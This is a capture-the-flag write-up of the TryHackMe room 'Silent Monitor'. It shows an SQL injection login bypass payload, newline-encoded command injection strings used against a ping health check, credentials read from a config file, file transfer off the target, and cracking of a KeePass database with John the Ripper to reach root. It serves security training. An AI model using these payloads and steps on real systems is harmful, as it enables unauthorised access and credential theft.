---
layout: post
title: "TryHackMe — Silent Monitor"
date: 2026-06-27
room_url: "https://tryhackme.com/room/silent-monitor"
category: writeup
platform: TryHackMe
difficulty: Medium
tags:
  - SQL Injection
  - Command Injection
  - Credential Exposure
  - KeePass
  - Password Cracking
  - Privilege Escalation
excerpt: "A Medium-rated room chaining SQL injection for authentication bypass, command injection via a network monitoring dashboard, credential extraction from a config file, and cracking a KeePass KDBX4 database to escalate to root."
---

## Overview

Silent Monitor is a Medium-rated TryHackMe room themed around a corporate Network Operations Centre portal. The challenge chains together multiple vulnerability classes — SQL injection to bypass authentication, command injection via a health check feature, credential discovery through logical filesystem enumeration, and cracking a KeePass password database to obtain root access.

What made this room valuable wasn't just the techniques — it was learning to read the environment. The audit log handed me the injection technique. The working directory handed me the config file. The room rewards paying attention over brute forcing every angle.

**Attack chain:**

```
Recon → Port 5050 discovered (NOC web portal)
→ Directory fuzzing → /internal login page
→ SQL injection → authenticated as netops
→ Command injection via health check → shell as www-data
→ pwd → /opt/netops → ls → secret.config
→ sysadmin credentials extracted
→ SSH as sysadmin → infrastructure.kdbx discovered
→ KeePass master password cracked → root password inside
→ su root → root shell
```

---

## 1. Recon

Started with a full port scan:

```bash
nmap -sV -sC -p- <TARGET_IP>
```

```
PORT   STATE SERVICE
22/tcp open  ssh
5050/tcp open  http    Werkzeug/2.0.2 Python/3.10.12
```

Port 5050 running a Python web application. Navigating to it in the browser returned a basic page. The non-standard port is worth noting — services not on default ports are easy to miss without a full `-p-` scan.

![Home page of target IP listening in custom port](/assets/images/writeups/silent-monitor/home_page.png)

Fuzzing for directories:

```bash
ffuf -w /usr/share/dirbuster/wordlists/directory-list-lowercase-2.3-medium.txt \
-u http://<TARGET_IP>:5050/FUZZ \
-mc 200,301,302
-t 64
```

Found:

```
/internal    [Status: 200]
```

Navigating to `/internal` revealed a login page — **CorpNet NOC Portal**.


---

## 2. SQL Injection — Authentication Bypass

I utilised the [SQL Login Bypass Payloads](https://github.com/HackTricks-wiki/hacktricks/blob/master/src/pentesting-web/login-bypass/sql-login-bypass.md):

```
Username: ' OR 1=1--
Password: anything
```

![SQLI via sign-in page ](/assets/images/writeups/silent-monitor/sql_injection.png)
  
  *Execute an sqli to modify the query therefore bypassing authentication*
  
**Why this works:**

The backend query likely looks like:

```sql
SELECT * FROM users WHERE username='input' AND password='input'
```

Injecting `' OR 1=1--` breaks out of the string and modifies the logic:

```sql
SELECT * FROM users WHERE username='' OR 1=1--' AND password='...'
```

`1=1` is always true — returns all users. `--` comments out the rest including the password check. Logged in as `netops`.

**Important syntax note:** SQL comparison uses `=` not `==`. `==` is Python/JavaScript syntax and will fail.

```
' OR 1==1--   ← failed (== is not valid SQL)
' OR 1=1--    ← correct
```

![Dashboard showing the internal system](/assets/images/writeups/silent-monitor/dashboard.png)
  
  *Inpsect Internals page once you bypass the sign-in via sqli * 

The dashboard revealed a live infrastructure overview — 12 hosts online, service statuses, network segments, and an audit log. The audit log immediately caught my attention:

```
2026-05-19 03:16:04  netops  HEALTH_CHECK  127.0.0.1%0awhoami
2026-05-19 03:15:52  netops  HEALTH_CHECK  127.0.0.10%0awhoami
```

`%0a` is a newline URL-encoded character (`\n`) — initially someone was already injecting commands through the health check. The room left the breadcrumb right there in the logs.
Now initially — I didn't know what encoded character this equates to. Adding it to BurpSuite and using the url-decoder inferred the encoded character to be a newline character -- `\n`.

---

## 3. Command Injection — Shell as www-data

![ICMP probes in Health Check Page](/assets/images/writeups/silent-monitor/health_check.png)
  
  *The **Host Health** page runs ICMP probes against a target IP*

The input field accepts a hostname or IP. If unsanitised, appending a newline followed by a command breaks out of ping and executes arbitrary commands.

Testing with `;` failed — filtered. Using the newline injection technique from the audit log via Burp Suite Repeater:

**Note:** The browser URL-encodes input before sending — `%0a` typed in the browser field gets double-encoded and fails. Always use Burp Repeater when injecting encoded characters directly into request parameters.

![Accessing the /etc/passwd file via command injection](/assets/images/writeups/silent-monitor/command_injection.png)
 
  *Using the health_check feature to execute a command injection via Burpsuite repeater*

Based on each users shell — we can inferr that the system contains 3 interactable users:
```
ubuntu:x:1000:1000:Ubuntu:/home/ubuntu:/bin/bash
sysadmin:x:1001:1001::/home/sysadmin:/bin/bash
root:x:0:0:root:/root:/bin/bash
```

`sysadmin` is a user we can utilise to get to root.

```
target=127.0.0.1%0aid
```

Output:

```
uid=33(www-data) gid=33(www-data) groups=33(www-data)
```

Command injection confirmed the user we are currently utilising is — `www-data`. As this user, the first thing to establish is context — where am I and what can 
I read?

```
127.0.0.1%0apwd:
```

Output:

```
/opt/netops
```

**Side note:** Logically it makes sense to inspect the user `id` and `pwd` to confirm who and where you are, before extracting the `/etc/passwd` file.
Personally that isn't how I approached this room — which isn't recommened. 

We are currently sitting within the running application's directory:  

```
127.0.0.1%0als -la /opt/netops
```

Output:

```
-rw-r--r-- 1 root     root      7283 app.py
-rw-rw---- 1 www-data www-data 20480 netops.db
-rw-r----- 1 root     www-data   446 secret.config
drwxr-x--- 2 root     www-data  4096 templates
```

the file catching my eye is, `secret.config` — owned by root, readable by `www-data`. The permissions were intentional — the backup agent needs it. Reading it:

![Using command injection to view secret.config file](/assets/images/writeups/silent-monitor/secret_file.png)
  
  *This gives us the sysadmin user's password*

Hardcoded credentials — with a comment admitting they know it's wrong. A classic real-world misconfiguration.

The enumeration logic here required no writeup:

```
www-data runs the web app
        ↓
Web apps run from a directory
        ↓
pwd reveals /opt/netops
        ↓
ls -la surfaces secret.config
        ↓
www-data has read permission
        ↓
Credentials extracted
```


## 4. SSH as sysadmin — KeePass Discovery

![Connected to `sysadmin` shell via ssh](/assets/images/writeups/silent-monitor/sysadmin.png)
  
  *Using the extracted password for `sysadmin` — We can log into the user via SSH* 

Enumerating as sysadmin:

```bash
sudo -l
```

```
Sorry, user sysadmin may not run sudo on tryhackme-2204.
```

No sudo. Checked home directory:

```bash
ls -la /home/sysadmin
```

```
drwxr-xr-x  backups/
-rw-r--r--  user.txt
```

```bash
ls backups/
```

```
README.txt  infrastructure.kdbx
```

```bash
cat README.txt
```

```
Backup archive — infrastructure credentials
Periodic exports from the credential store are placed here by the backup agent.
infrastructure.kdbx — KeePass credential database
```

A KeePass `.kdbx` file — an encrypted credential database. The master password is all that stands between us and whatever's inside.

Retrieved the user flag:

```bash
cat user.txt
```

---

## 5. Cracking the KeePass Database

Transferred the file to Kali:

```bash
# On target
python3 -m http.server 8888

# On Kali
wget http://<TARGET_IP>:8888/infrastructure.kdbx
```

**The KDBX 4.0 problem:**

The database uses KDBX format version 4.0 — a newer format that most tools don't support out of the box:

```bash
keepass2john infrastructure.kdbx > kdbx.hash
! infrastructure.kdbx : File version '40000' is currently not supported!
```

```bash
hashcat -m 13400 infrastructure.kdbx /usr/share/wordlists/rockyou.txt
# Salt-value exception — needs extracted hash, not raw file
```

**The fix — bleeding-jumbo John:**

The standard `keepass2john` is outdated. The bleeding-jumbo branch of John the Ripper has KDBX 4.0 support:

```bash
git clone https://github.com/openwall/john -b bleeding-jumbo
cd john/src
./configure && make
```

Extract the hash:

```bash
cd ../run
./keepass2john /root/infrastructure.kdbx > /root/kdbx.hash
```

Crack it:

```bash
john /root/kdbx.hash --wordlist=/usr/share/wordlists/rockyou.txt
```

Master password found.

**Opening the database:**

Standard `kpcli` also doesn't support KDBX 4.0:

```
KDBX4 files are not directly supported, but they can be imported.
```

Install KeePassXC which has full KDBX 4.0 support:

```bash
sudo apt install keepassxc
keepassxc infrastructure.kdbx
```


Enter the master password — inside the database: root's password.

![Entering keepass utilising extracted password](/assets/images/writeups/silent-monitor/keepass.png)
  
  *Enter the extracted password*

Interact with the database to find the root password:

![Get root password via kdbx database](/assets/images/writeups/silent-monitor/root_password.png)

---

## 6. Root

```bash
su root
```

![Root shell accessed](/assets/images/writeups/silent-monitor/root.png)
 
  *Enter root's password from the KeePass database.*


The final flag reside within root:
```bash
cd /root
```

---

## Key Takeaways

| Technique | Lesson |
|---|---|
| SQL injection auth bypass | `' OR 1=1--` breaks credential checks — SQL uses `=` not `==` |
| Audit log analysis | The log revealed the `%0a` injection technique before I even started attacking the health check |
| Command injection | Unsanitised input passed to shell commands — `;` was filtered but newline `%0a` bypassed it |
| Browser vs Burp | Browser double-encodes `%0a` — always use Burp Repeater for raw injection |
| Config file enumeration | `pwd` → `ls -la` in the working directory surfaces config files naturally without guessing |
| Hardcoded credentials | Config files often contain passwords — always read them fully, including comments |
| KDBX 4.0 tooling | Standard `keepass2john` and `kpcli` don't support KDBX 4.0 — use bleeding-jumbo John and KeePassXC |
| Credential stores | KeePass databases in backup directories almost always contain privileged credentials |

---

## Tools Used

- nmap
- ffuf
- Burp Suite
- netcat
- John the Ripper (bleeding-jumbo)
- KeePassXC
- Python3 HTTP server

---

*Room completed on TryHackMe. Write-up by Wandipa Marema — 2026-06-27*
